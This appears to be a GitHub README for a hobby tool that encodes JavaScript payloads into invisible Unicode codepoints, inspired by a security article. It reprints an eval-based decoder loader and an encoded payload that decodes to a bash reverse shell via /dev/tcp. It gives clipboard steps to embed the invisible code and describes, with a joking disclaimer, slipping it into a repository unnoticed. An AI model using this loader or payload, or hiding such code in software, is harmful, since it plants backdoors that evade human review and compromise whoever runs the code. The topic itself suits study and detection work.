# PUA Encoder

A simple PUA encoder for payloads.

## Why?

When I saw the [Aikido article about PUA](https://www.aikido.dev/blog/the-return-of-the-invisible-threat-hidden-pua-unicode-hits-github-repositorties), I knew I had to try it myself.

And oh boy, this is insane.

Go read that article to get the full picture, but basically [PUA](https://en.wikipedia.org/wiki/Private_Use_Areas) is a set of 6400 codepoints that are not used in the Unicode standard.

We can use them to hide our payloads, they'll be invisible to the human eye, but the computer will still be able to read them.

The Aikido article shows a payload that has been used in the wild:
```js
const d=s=>[...s].map(c=>(c=c.codePointAt(0),c>=0xFE00&&c<=0xFE0F?c-0xFE00:c>=0xE0100&&c<=0xE01EF?c-0xE0100+16:null)).filter(b=>b!==null);eval(Buffer.from(d(``)).toString('utf-8'));
```

Basically, if a char is in the range `0xFE00` to `0xFE0F`, we subtract `0xFE00` to get the index of the char in the PUA list.
That gives us our first 16 bytes.

If a char is in the range `0xE0100` to `0xE01EF`, we subtract `0xE0100` and add 16 to get the index.
That gives us the next 240 bytes.

And with this, we have the full set of UTF-8 bytes (256).

We can now encode our invisible payload and it should be evaluated just fine.

## Enough theory, let's code!

I crafted an encoder that takes a payload as input and returns the encoded version.

If you run it, you'll see that the payload is completely invisible, but there are codepoints:
```
Encoded payload:
----------------
󠄘󠄘󠄙󠄭󠄮󠅫󠅓󠅟󠅞󠅣󠅤󠅫󠅣󠅠󠅑󠅧󠅞󠅭󠄭󠅢󠅕󠅡󠅥󠅙󠅢󠅕󠄘󠄗󠅓󠅘󠅙󠅜󠅔󠅏󠅠󠅢󠅟󠅓󠅕󠅣󠅣󠄗󠄙󠄫󠅓󠅟󠅞󠅣󠅤󠄐󠅠󠄭󠅣󠅠󠅑󠅧󠅞󠄘󠄗󠅒󠅑󠅣󠅘󠄗󠄜󠅋󠄗󠄝󠅓󠄗󠄜󠄗󠅑󠅣󠅘󠄝󠅙󠄐󠄮󠄖󠄐󠄟󠅔󠅕󠅦󠄟󠅤󠅓󠅠󠄟󠄡󠄢󠄧󠄞󠄠󠄞󠄠󠄞󠄡󠄟󠄩󠄠󠄠󠄡󠄐󠄠󠄮󠄖󠄡󠄗󠅍󠄜󠅫󠅔󠅕󠅤󠅑󠅓󠅘󠅕󠅔󠄪󠅤󠅢󠅥󠅕󠄜󠅣󠅤󠅔󠅙󠅟󠄪󠄗󠅙󠅗󠅞
----------------
Codepoints (hex): [
  'U+E0118', 'U+E0118', 'U+E0119', 'U+E012D', 'U+E012E', 'U+E016B',
  'U+E0153', 'U+E015F', 'U+E015E', 'U+E0163', 'U+E0164', 'U+E016B',
  'U+E0163', 'U+E0160', 'U+E0151', 'U+E0167', 'U+E015E', 'U+E016D',
  'U+E012D', 'U+E0162', 'U+E0155', 'U+E0161', 'U+E0165', 'U+E0159',
  'U+E0162', 'U+E0155', 'U+E0118', 'U+E0117', 'U+E0153', 'U+E0158',
  'U+E0159', 'U+E015C', 'U+E0154', 'U+E014F', 'U+E0160', 'U+E0162',
  'U+E015F', 'U+E0153', 'U+E0155', 'U+E0163', 'U+E0163', 'U+E0117',
  'U+E0119', 'U+E012B', 'U+E0153', 'U+E015F', 'U+E015E', 'U+E0163',
  'U+E0164', 'U+E0110', 'U+E0160', 'U+E012D', 'U+E0163', 'U+E0160',
  'U+E0151', 'U+E0167', 'U+E015E', 'U+E0118', 'U+E0117', 'U+E0152',
  'U+E0151', 'U+E0163', 'U+E0158', 'U+E0117', 'U+E011C', 'U+E014B',
  'U+E0117', 'U+E011D', 'U+E0153', 'U+E0117', 'U+E011C', 'U+E0117',
  'U+E0152', 'U+E0151', 'U+E0163', 'U+E0158', 'U+E0110', 'U+E011D',
  'U+E0159', 'U+E0110', 'U+E012E', 'U+E0116', 'U+E0110', 'U+E011F',
  'U+E0154', 'U+E0155', 'U+E0166', 'U+E011F', 'U+E0164', 'U+E0153',
  'U+E0160', 'U+E011F', 'U+E0121', 'U+E0122', 'U+E0127', 'U+E011E',
  'U+E0120', 'U+E011E', 'U+E0120', 'U+E011E',
  ... 59 more items
]
```

To be more efficient, you can comment out the `console.log` lines and keep only the one that prints the invisible codepoints, then copy the output to your clipboard:
```bash
node encoder.js | tr -d '\n' | xclip -selection clipboard
```

With this in your clipboard, you can use the code from the Aikido article to evaluate the payload:

```js
const d = s => [...s].map(c => (c = c.codePointAt(0), c >= 0xFE00 && c <= 0xFE0F ? c - 0xFE00 : c >= 0xE0100 && c <= 0xE01EF ? c - 0xE0100 + 16 : null)).filter(b => b !== null); eval(Buffer.from(d(``)).toString('utf-8'));
```

Then paste your clipboard content into the `` ` `` of the `d()` function.

The content will be invisible even here.

Then you could commit this to a GitHub project, stay stealthy by making good commits, and one day slip in this line of code. No one will understand what's happening, and they might even think you're a genius and approve the commit. **(I AM JOKING, DO NOT DO THIS!!)**

The file `randomrepo.js` is vibe-coded just to mimic a random repo, with a line of "optimization" that will be executed — and boom, full access to the system that runs it.

## Have fun, that's the most important part!

I had a lot of fun working on this (even if it's completely useless). I had some basic knowledge about PUA and codepoints, but I'd never actually used them before, so this was a nice little experiment. No idea why I never thought of using PUA to hide payloads before — it's such a cool trick.

Have fun!